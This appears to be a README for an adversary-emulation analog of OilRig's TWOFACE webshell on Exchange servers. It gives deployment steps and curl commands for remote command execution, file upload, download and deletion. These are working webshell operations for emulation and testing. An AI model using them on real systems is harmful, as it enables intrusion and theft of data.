# TWOFACE WebShell Analog

## Setup
This file does not need to be compiled - it is a self contained (i.e., no code-behind file) C# application in
aspx format. However, the default `web.config` file for the IIS site may require modifications, specifically
to add the following line under the `<assemblies>` tag:

`<add assembly="Microsoft.Exchange.Diagnostics, Version=15.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />`

For this scenario, OilRig has placed this webshell under `C:\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews`
using various file names (for our purposes, `contact.aspx`)<sup>[1](https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/)</sup>.

Default access is limited to Windows Authentication, so requests made to the page will need valid credentials for an authorized user.

## Execution with the Shell
All execution takes place via HTTP POST<sup>[1](https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/)</sup>. If a GET request is sent, the C# will not execute and the visitor will be given a fake
error page saying the resource cannot be found on the server. Responses to actions taken with the shell will be provided at the
end of the returned page under a `<pre>` tag. If you are using PowerShell instead of cUrl to issue the request, you will need
to select and expand the Content element of the response.

If Windows Authenticiation is used, cUrl commands must contain additional flags to allow for successful negotiation:
`--http1.1` and `--ntlm`. HTTPV2 does not support NTLM authentication.

### Command Execution
Command execution requires two POST parameters<sup>[1](https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/)</sup>: 
* `pro` - the process to use for execution (cmd.exe or powershell.exe)
* `cmd` - The command to execute

Commands **are not** URL encoded per the CTI. For complex commands, consider using Base64 and encoded PowerShell. Please note:
'+' is a valid Base64 character and may be converted to a space in transit.

Examples:

```
CMD:
curl --http1.1 --ntlm -u 'domain\user:password' -k -X POST --data "pro=cmd.exe" --data "cmd=whoami" .../EWS/contact.aspx

PowerShell
curl --http1.1 --ntlm -u 'domain\user:password' -k -X POST --data "pro=powershell.exe" --data "cmd=Get-Childitem -Path 'c:\users\'" .../EWS/contact.aspx
curl --http1.1 --ntlm -u 'domain\user:password' -k -X POST --data "pro=powershell.exe" --data "cmd=-e dwBoAG8AYQBtAGkA" .../EWS/contact.aspx
```

### File Actions
The webshell supports two different sets of file actions:
* Upload file to the %TEMP% directory
* Upload file to arbitrary path
* Download file from arbitrary path
* Delete file (from %TEMP% by default, or arbitrary path if supplied)

#### %TEMP% File Upload
File uploads to %TEMP% (`C:\Windows\Temp` by default) require two parameters<sup>[1](https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/)</sup>:
* `upd` - the file name to use on the victim
* `upb` - The Base64-encoded content of the file (note: unlike encoded commands above, we have modified this command to replace 
spaces with '+' signs to allow for binary file uploads)

Example:
```
curl --http1.1 --ntlm -u 'domain\user:password' -k -X POST --data "upd=file.ext" --data "upb=$(base64 file.ext)" .../EWS/contact.aspx
```

#### Arbitrary Path File Upload
This form up upload requires POST Form data and more parameters<sup>[1](https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/)</sup>:
* `upl` - the *POST form field* that contains the file data to write to disk
* `sav` - the path in which to save the file
* `vir` - boolean value to specify if this is a virtual path or physical (default)
* `nen` - the file name on the *victim* (defaults to the uploaded file name)
* \[arbitrary\] - a field containing the file information. **NAME MUST MATCH THE VALUE GIVEN IN upl**

Example:
```
curl --http1.1 --ntlm -u 'domain\user:password' -k -X POST -F "upl=f1" -F 'sav=C:\Users\Public\' -F "vir=false" -F "nen=file.ext" -F 'f1=@file.ext' .../EWS/contact.aspx
```

#### File Download
Downloads only require a single field: `don` - the path to the file<sup>[1](https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/)</sup>

Example:
```
curl --http1.1 --ntlm -u 'domain\user:password' -k -X POST -k -X POST -o file.ext --data 'don=c:\windows\temp\file.ext' .../EWS/contact.aspx
```

#### File Delete
File deletes only require a single parameter: `del` - the name of the file to delete<sup>[1](https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/)</sup>

If no path is supplied, %TEMP% will be used. Otherwise, specify path\\to\\file.ext

Examples:
```
Deletes from %TEMP%:
curl --http1.1 --ntlm -u 'domain\user:password' -k -X POST --data 'del=file.ext' .../EWS/contact.aspx

Deletes from path:
curl --http1.1 --ntlm -u 'domain\user:password' -k -X POST --data 'del=c:\users\public\file.ext' .../EWS/contact.aspx
```

## Testing
A shell script has been provided to exercise each of the options using cUrl. The user will be prompted for a few
details on where to send the requests and any authentication information (Windows Authentication only). Ensure
the user running the script has write access to the directory it is being run from as a few test files will be made.

`./twoface_tests.sh`

## CTI
[1] [Unit 42 - TwoFace Webshell: Persistent Access Point for Lateral Movement](https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/)
